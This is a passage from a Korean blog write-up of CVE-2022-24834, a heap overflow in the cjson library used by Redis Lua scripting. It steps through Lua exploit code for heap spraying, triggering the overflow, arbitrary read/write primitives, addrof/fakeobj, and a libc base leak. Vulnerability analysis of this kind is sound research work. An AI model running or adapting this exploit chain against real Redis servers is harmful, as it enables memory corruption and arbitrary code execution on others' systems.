&#xBC18;&#xBCF5;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xC790;&#xC758; free list&#xB97C; &#xBE44;&#xC6C1;&#xB2C8;&#xB2E4;.</p><p>Spray&#xB41C; &#xB370;&#xC774;&#xD130;&#xBCF4;&#xB2E4; Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; encode &#xBC84;&#xD37C;&#xAC00; &#xB354; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB3C4;&#xB85D; <code>cjson.encode_keep_buffer(&apos;on&apos;)</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;&#xAC00; &#xC7AC;&#xC0AC;&#xC6A9;&#xB418;&#xAC8C; &#xB9CC;&#xB4E4;&#xACE0; Corruption&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB300;&#xB7C9;&#xC758; dummy chunk&#xB97C; &#xD560;&#xB2F9;&#xD55C; &#xB2E4;&#xC74C; <code>target_ptr</code>&#xC744; Spray&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> spray_holder = {}<span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,<span class="hljs-number">128</span> <span class="hljs-keyword">do</span>   spray_holder[i] = {}<span class="hljs-keyword">end</span><span class="hljs-comment">-- error((&quot;spray_holder: %s&quot;):format(tostring(spray_holder)))</span><span class="hljs-comment">--</span><span class="hljs-comment">-- Flush allocator caches</span><span class="hljs-comment">--</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,<span class="hljs-number">0x42</span> <span class="hljs-keyword">do</span>   <span class="hljs-keyword">for</span> j=<span class="hljs-number">1</span>,<span class="hljs-number">200</span> <span class="hljs-keyword">do</span> <span class="hljs-comment">-- To increase reliability, make more iterations.</span>      refs[refs_i] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(string_source, <span class="hljs-number">8</span>*(j<span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>, <span class="hljs-number">8</span>*(j<span class="hljs-number">-1</span>)+<span class="hljs-number">1</span> + <span class="hljs-built_in">math</span>.<span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, i*<span class="hljs-number">0x10</span> - string_overhead) - <span class="hljs-number">1</span>)      refs_i = refs_i + <span class="hljs-number">1</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">256</span> <span class="hljs-keyword">do</span>   refs[refs_i] = { string_source:<span class="hljs-built_in">byte</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span> - <span class="hljs-number">5</span>) }   refs_i = refs_i + <span class="hljs-number">1</span><span class="hljs-keyword">end</span>cjson.encode_keep_buffer(<span class="hljs-string">&apos;on&apos;</span>)<span class="hljs-keyword">local</span> top = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(string_source, <span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span> - string_overhead - <span class="hljs-number">1</span>)<span class="hljs-keyword">local</span> result = cjson.encode(top) <span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, n_expand <span class="hljs-keyword">do</span>   heap_expand[i] = { string_source:<span class="hljs-built_in">byte</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span> - <span class="hljs-number">5</span>) }<span class="hljs-keyword">end</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,#spray_holder <span class="hljs-keyword">do</span>   spray_holder[i][<span class="hljs-number">1</span>] = target_ptr<span class="hljs-keyword">end</span></code></pre><p>Spary&#xAC00; &#xB05D;&#xB09C; &#xC2DC;&#xC810;&#xC5D0;&#xC11C;&#xC758; &#xD799;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC0C1;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%203.png" alt="Untitled"></p><p><code>spray_holder[i][1] = target_ptr</code>&#xB97C; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD558;&#xBA74;&#xC11C; target array&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>Table</code>&#xC774; &#xB2E4;&#xC218; &#xD560;&#xB2F9;&#xB418;&#xACE0; &#xC774;&#xC911; &#xD558;&#xB098;&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; Partial Overwrite&#xB85C; <code>Fake Table</code>&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="4-Heap-Overflow"><a href="#4-Heap-Overflow" class="headerlink" title="4. Heap Overflow"></a>4. Heap Overflow</h3><p>Spray&#xB97C; &#xC644;&#xB8CC;&#xD55C; &#xD6C4; <code>cjson.encode(evil)</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; Overflow&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>spary_holder</code>&#xB97C; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C; Partial Overwrite&#xB418;&#xC5B4; <code>array</code> &#xD544;&#xB4DC;&#xC758; LSB&#xAC00; 0x22&#xC778; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; <code>fake_array</code>&#xB85C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">--</span><span class="hljs-comment">-- Trigger vulnerability: Heap overflow on encode_buf</span><span class="hljs-comment">--</span>refs[refs_i] = cjson.encode(evil)refs_i = refs_i + <span class="hljs-number">1</span><span class="hljs-keyword">local</span> fake_array = <span class="hljs-literal">nil</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,#spray_holder <span class="hljs-keyword">do</span>   <span class="hljs-comment">-- spray_holder[i][1][1] = 0x1337</span>   <span class="hljs-keyword">local</span> obj = spray_holder[i][<span class="hljs-number">1</span>]   <span class="hljs-keyword">if</span> <span class="hljs-built_in">tostring</span>(obj):<span class="hljs-built_in">sub</span>(<span class="hljs-number">-2</span>) == <span class="hljs-string">&quot;22&quot;</span> <span class="hljs-keyword">then</span>      fake_array = obj      <span class="hljs-comment">-- error((&quot;found: %d&quot;):format(i))</span>      <span class="hljs-keyword">break</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> fake_array == <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span>   <span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;Bad luck...&quot;</span>)<span class="hljs-keyword">end</span></code></pre><h3 id="5-Arbitrary-Address-Read-Write"><a href="#5-Arbitrary-Address-Read-Write" class="headerlink" title="5. Arbitrary Address Read/Write"></a>5. Arbitrary Address Read/Write</h3><p><code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; &#xB113;&#xC740; &#xD799; &#xC601;&#xC5ED;&#xC744; <code>TValue</code> &#xBC30;&#xC5F4;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>fake_array[i]</code>&#xC640; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC30;&#xC5F4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xACBD;&#xC6B0;, Lua&#xC758; &#xC778;&#xB371;&#xC2A4;&#xB294; 1&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>array[i-1]</code>&#xC758; <code>Value</code>&#xC640; <code>tt</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, <code>fake_array[0x5] = 0</code>&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>array[0x4].Value</code>&#xC5D0; 0&#xC774; &#xC4F0;&#xC774;&#xACE0; <code>array[0x4].tt</code>&#xC5D0;&#xB294; 3(<code>LUA_TNUMBER</code>)&#xAC00; &#xC4F0;&#xC774;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xB54C;&#xB294; <code>tt</code>&#xB97C; &#xD1B5;&#xD574; &#xD0C0;&#xC785;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xD0C0;&#xC785;&#xC5D0; &#xB530;&#xB77C; &#xC801;&#xC808;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <code>TValue</code>&#xAC00; 0x10 &#xD06C;&#xAE30;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB294; 0x0&#xC73C;&#xB85C; &#xB05D;&#xB098;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xC81C;&#xD55C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC880; &#xB354; &#xC790;&#xC720;&#xB85C;&#xC6B4; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; <code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC778; Fake Table&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC0C8;&#xB85C;&#xC6B4; Fake Table&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- overwrite array pointer</span><span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x20</span> - fake_array_base) / <span class="hljs-number">0x10</span>)fake_array[<span class="hljs-number">1</span> + ofs] = struct.<span class="hljs-built_in">unpack</span>(<span class="hljs-string">&apos;d&apos;</span>, p64(fake_array_base - <span class="hljs-number">8</span>))<span class="hljs-comment">-- overwrite node pointer to NULL</span><span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x28</span> - (fake_array_base<span class="hljs-number">-8</span>)) / <span class="hljs-number">0x10</span>)owow_array1[<span class="hljs-number">1</span> + ofs] = <span class="hljs-number">0</span><span class="hljs-comment">-- overwrite size</span><span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x40</span> - fake_array_base) / <span class="hljs-number">0x10</span>)fake_array[<span class="hljs-number">1</span> + ofs] = bytes_to_double(<span class="hljs-string">&quot;\255\255\255\127\000\000\000\000&quot;</span>)</code></pre><p><code>owow_array1</code>&#xC740; &#xC0AC;&#xC804;&#xC5D0; &#xC0DD;&#xC131;&#xB41C; <code>fake_array_base</code> &#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>Table</code>&#xC774;&#xACE0; <code>owow_array1_addr</code>&#xC740; &#xC774; <code>Table</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; <code>local ofs = math.floor((owow_array1_addr + 0x20 - fake_array_base) / 0x10)</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; <code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; <code>owow_array1</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. <code>ofs</code>&#xB294; &#xC77D;&#xAC70;&#xB098; &#xC4F8; &#xC8FC;&#xC18C;&#xAC12;&#xC5D0;&#xC11C; Fake Table&#xC758; <code>array</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAC12;&#xC744; &#xBE80; &#xB2E4;&#xC74C; &#xC774;&#xB97C; 0x10&#xC73C;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xACC4;&#xC0B0;&#xB41C; <code>ofs</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>array</code> &#xD544;&#xB4DC;&#xB97C; <code>fake_array_base-8</code>&#xB85C; &#xC870;&#xC791;&#xD558;&#xBA74; <code>owow_array1</code>&#xC744; &#xD1B5;&#xD574; 0x8&#xB85C; &#xB05D;&#xB098;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xB3C4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>array</code> &#xD544;&#xB4DC;&#xAC00; <code>TValue.Value</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4; <code>fake_array_base - 8</code>&#xC774; &#xC4F0;&#xC774;&#xACE0;, &#xC778;&#xC811;&#xD55C; <code>node</code> &#xD544;&#xB4DC;&#xB294; <code>tt</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xC5B4; 3(<code>LUA_TNUMBER</code>) &#xAC12;&#xC774; &#xC4F0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD55C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>owow_array1</code>&#xC744; &#xD1B5;&#xD574; <code>node</code> &#xD544;&#xB4DC;&#xB97C; <code>NULL</code>&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;. <code>owow_array1</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAC00; <code>fake_array_base - 8</code>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 0x8&#xB85C; &#xB05D;&#xB098;&#xB294; &#xD799; &#xC8FC;&#xC18C;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>owow_array1</code>&#xB3C4; <code>fake_array</code>&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>sizearray</code> &#xD544;&#xB4DC;&#xB97C; 0x7fffffff&#xB85C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>fake_array</code>&#xC640; <code>owow_array1</code>&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xAD6C;&#xD604;&#xD55C; &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">semi_aaw</span><span class="hljs-params">(addr, value)</span></span>   <span class="hljs-comment">-- Warning: This will write 0x03 (qword) tag at addr + 8.</span>   <span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x20</span> - fake_array_base) / <span class="hljs-number">0x10</span>)   fake_array[<span class="hljs-number">1</span> + ofs] = struct.<span class="hljs-built_in">unpack</span>(<span class="hljs-string">&apos;d&apos;</span>, p64(addr))   owow_array1[<span class="hljs-number">1</span>] = value<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">semi_aar</span><span class="hljs-params">(addr)</span></span>   <span class="hljs-comment">-- Warning: This requires 0x03 (qword) tag at addr + 8.</span>   <span class="hljs-keyword">local</span> ofs = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">floor</span>((owow_array1_addr + <span class="hljs-number">0x20</span> - fake_array_base) / <span class="hljs-number">0x10</span>)   fake_array[<span class="hljs-number">1</span> + ofs] = struct.<span class="hljs-built_in">unpack</span>(<span class="hljs-string">&apos;d&apos;</span>, p64(addr))   <span class="hljs-keyword">return</span> owow_array1[<span class="hljs-number">1</span>]<span class="hljs-keyword">end</span></code></pre><p><code>semi_aaw</code>&#xB294; <code>fake_array</code>&#xB97C; &#xD1B5;&#xD574; <code>owow_array1</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; &#xC4F0;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; <code>owow_array1[1] = value</code>&#xB85C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xD2B9;&#xC815; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xACE0; <code>semi_aar</code>&#xB3C4; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC73C;&#xB098; &#xC77D;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC8FC;&#xC18C; + 0x8&#xC774; <code>TValue.tt</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC758; &#xAC12;&#xC774; 3(<code>LUA_TNUMBER</code>)&#xC77C; &#xD544;&#xC694;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="6-addrof-amp-fakeobj"><a href="#6-addrof-amp-fakeobj" class="headerlink" title="6. addrof &amp; fakeobj"></a>6. addrof &amp; fakeobj</h3><p>&#xAE30;&#xC874;&#xC758; <code>addrof</code>&#xB294; <code>tostring</code> &#xD568;&#xC218;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xB098; &#xC22B;&#xC790;&#xC640; &#xAC19;&#xC740; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>semi_aar</code>&#xACFC; <code>semi_aaw</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xD0C0;&#xC785;&#xC5D0; &#xB300;&#xD574; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xB294; <code>addrof</code>&#xB97C; &#xC7AC;&#xC815;&#xC758;&#xD558;&#xACE0; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; Fake Closure &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C; &#xC0AC;&#xC6A9;&#xD560; <code>fakeobj</code>&#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">semi_aaw(addrof(leaker_array) + <span class="hljs-number">0x28</span>, int_to_double(<span class="hljs-number">3</span>)) <span class="hljs-comment">-- LUA_TNUMBER</span><span class="hljs-keyword">local</span> leaker_array_array_addr = double_to_int(semi_aar(addrof(leaker_array) + <span class="hljs-number">0x20</span>)) <span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrof</span><span class="hljs-params">(obj)</span></span>   leaker_array[<span class="hljs-number">1</span>] = obj   semi_aaw(leaker_array_array_addr + <span class="hljs-number">8</span>, int_to_double(<span class="hljs-number">3</span>))   <span class="hljs-keyword">return</span> double_to_int(semi_aar(leaker_array_array_addr))<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeobj</span><span class="hljs-params">(addr, tt)</span></span>   semi_aaw(leaker_array_array_addr, int_to_double(addr))   semi_aaw(leaker_array_array_addr + <span class="hljs-number">8</span>, int_to_double(tt))   <span class="hljs-keyword">return</span> leaker_array[<span class="hljs-number">1</span>]<span class="hljs-keyword">end</span></code></pre><p><code>leaker_array</code>&#xB294; &#xC0AC;&#xC804;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>Table</code>&#xB85C; <code>owow_array1</code>&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>fake_array_base</code>&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. <code>addrof</code> &#xAD6C;&#xD604;&#xC744; &#xC704;&#xD574; &#xBA3C;&#xC800; <code>leaker_array</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAC12;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. <code>semi_aaw</code>&#xB85C; <code>leaker_array</code>&#xC758; <code>node</code> &#xD544;&#xB4DC;&#xC5D0; 3&#xC744; &#xC4F0;&#xBA74; <code>semi_aar</code>&#xB85C; <code>leaker_array</code>&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; &#xC77D;&#xC744; &#xB54C; 3&#xC774; <code>Value.tt</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xBA74;&#xC11C; <code>array</code> &#xC8FC;&#xC18C;&#xAC00; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>addrof</code>&#xC5D0;&#xC11C;&#xB294; <code>leaker_array[1]</code>&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB123;&#xACE0; <code>leaker_array</code>&#xC758; <code>array</code> + 8&#xC758; &#xC8FC;&#xC18C;&#xC5D0; 3(<code>LUA_TNUMBER</code>)&#xC744; &#xC501;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>semi_aar</code>&#xB85C; <code>leaker_array</code>&#xC758; <code>array</code>&#xB97C; &#xC77D;&#xC73C;&#xBA74; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>fakeobj</code> &#xD568;&#xC218;&#xB294; <code>semi_aaw</code>&#xB85C; <code>leaker_array[1]</code>&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xD0C0;&#xC785;&#xC744; &#xC4F4; &#xB2E4;&#xC74C; &#xC774;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; Fake &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="7-Leak-Library-base"><a href="#7-Leak-Library-base" class="headerlink" title="7. Leak Library base"></a>7. Leak Library base</h3><p>&#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; gadget&#xACFC; &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; libc base &#xC8FC;&#xC18C;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find_libc_base</span><span class="hljs-params">(leak)</span></span>     leak = leak - (leak % <span class="hljs-number">0x1000</span>)     <span class="hljs-comment">-- while read_i64_at(leak) ~= 0x03010102464c4580 do</span>     <span class="hljs-keyword">while</span> read_i32_at(leak) ~= <span class="hljs-number">0x464c457f</span> <span class="hljs-keyword">do</span>         leak = leak - <span class="hljs-number">0x1000</span>     <span class="hljs-keyword">end</span>     <span class="hljs-keyword">return</span> leak <span class="hljs-keyword">end</span> ... <span class="hljs-keyword">local</span> stack_leak = <span class="hljs-number">0</span> <span class="hljs-keyword">local</span> libc_leak = <span class="hljs-number">0</span> <span class="hljs-keyword">local</span> coro = <span class="hljs-string">&apos;xxx&apos;</span> <span class="hljs-keyword">local</span> coro_fn = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>     <span class="hljs-keyword">local</span> coro_addr = addrof(coro)     stack_leak = read_i64_at(coro_addr + <span class="hljs-number">0xa8</span>)     <span class="hljs-comment">-- libc_leak  = read_i64_at(stack_leak + 0x88)</span>     <span class="hljs-keyword">local</span> i = <span class="hljs-number">0</span>     <span class="hljs-keyword">while</span> libc_leak == <span class="hljs-number">0</span> <span class="hljs-keyword">do</span>         <span class="hljs-keyword">local</span> cand = read_i64_at(stack_leak + i * <span class="hljs-number">8</span>)         i = i + <span class="hljs-number">1</span>         <span class="hljs-keyword">if</span> cand &gt; <span class="hljs-number">0x7f0000000000</span> <span class="hljs-keyword">and</span> cand &lt; <span class="hljs-number">0x800000000000</span> <span class="hljs-keyword">then</span>             libc_leak = cand             <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">yield</span>()         <span class="hljs-keyword">end</span>     <span class="hljs-keyword">end</span> <span class="hljs-keyword">end</span> coro = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(coro_fn) <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> can_read(addrof(coro)) <span class="hljs-keyword">do</span>     coro = <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">create</span>(coro_fn) <span class="hljs-keyword">end</span> <span class="hljs-built_in">coroutine</span>.<span class="hljs-built_in">resume</span>(coro) <span class="hljs-keyword">local</span> libc_base = find_libc_base(libc_leak)</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; coroutine&#xC744; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0B8; &#xB2E4;&#xC74C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130; &#xC911; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xCD94;&#xCE21;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>find_libc_base</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;</p><p>&#xC720;&#xCD9C;&#xD55C; 